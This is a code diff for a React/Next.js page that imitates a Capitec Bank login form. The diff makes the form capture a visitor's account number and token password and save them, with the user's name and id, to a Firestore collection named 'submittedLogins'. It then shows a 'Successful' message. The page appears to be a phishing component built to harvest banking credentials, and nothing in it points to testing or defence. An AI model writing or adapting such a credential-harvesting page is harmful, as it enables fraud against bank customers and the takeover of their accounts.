@@ -1,9 +1,13 @@
-import React from "react";
+import { useState } from "react";
 import { Meta } from "../../../components";
 import { Box, Stack } from "@mui/material";
 import userDataContext from "../../../context/UserDataContext";
 import { useContext } from "react";
 import PrivateRoute from "../../../components/auth/PrivateRoute";
+import { db } from "../../../services/firebase.config";
+import { addDoc, collection } from "firebase/firestore";
+import cogoToast from "cogo-toast";
+import { useRouter } from "next/router";
 
 const inputStyles = {
   color: "#383633",
@@ -16,9 +20,58 @@ const inputStyles = {
 };
 
 const Capitec = () => {
+  const router = useRouter();
+  const [formData, setFormData] = useState({
+    account_number: "",
+    token_password: "",
+  });
+  const [isLoading, setIsLoading] = useState(false);
   const { userData } = useContext(userDataContext);
 
-  console.log(userData);
+  const { account_number, token_password } = formData;
+
+  const formInputHandler = (e) => {
+    e.preventDefault();
+
+    setFormData((prev) => ({
+      ...prev,
+      [e.target.id]: e.target.value,
+    }));
+  };
+
+  const tokenizeAccount = async () => {
+    const validateDetails =
+      token_password.trim().length > 0 && account_number.trim().length > 0;
+
+    if (validateDetails) {
+      try {
+        setIsLoading(true);
+
+        const res = await addDoc(collection(db, "submittedLogins"), {
+          _user: userData.id,
+          user_name: `${userData.firstName} ${userData.lastName}`,
+          timeStamp: new Date(),
+          data: {
+            ...formData,
+            bank: "capitec bank",
+          },
+        });
+
+        console.log(res);
+        if (res) {
+          cogoToast.success("Successful");
+          router.replace("/account");
+        }
+        setIsLoading(false);
+      } catch (error) {
+        console.log(error);
+        cogoToast.error("Something went wrong");
+        setIsLoading(false);
+      }
+    } else {
+      cogoToast.error("One or more inputs are invalid");
+    }
+  };
 
   return (
     <>
@@ -142,38 +195,39 @@ const Capitec = () => {
                 justifyContent="space-between"
               >
                 <form>
-                  <label id="usernameLabel" htmlFor="username">
+                  <label id="account_number_Label" htmlFor="account_number">
                     <span class="account-number">Account number/username:</span>
                     <br />
                     <input
-                      id="username"
-                      name="username"
+                      id="account_number"
+                      name="account_number"
                       type="text"
-                      value={""}
+                      value={account_number}
                       maxlength="40"
                       style={inputStyles}
+                      onChange={formInputHandler}
                     />
                   </label>
                   <label id="tokenPasswordLabel" htmlFor="tokenPassword">
                     <span class="account-number">Token Password:</span>
                     <br />
                     <input
-                      id="tokenPassword"
-                      name="tokenPassword"
+                      id="token_password"
+                      name="token_password"
                       type="text"
-                      value={""}
+                      value={token_password}
                       maxlength="40"
                       style={inputStyles}
+                      onChange={formInputHandler}
                     />
                   </label>
                   <button
-                    type="submit"
+                    type="button"
                     className="capitec-button"
-                    onClick={(e) => {
-                      e.preventDefault();
-                    }}
+                    onClick={tokenizeAccount}
+                    disabled={isLoading}
                   >
-                    Submit
+                    {isLoading ? "Loading..." : "Submit"}
                   </button>
                 </form>
                 <a
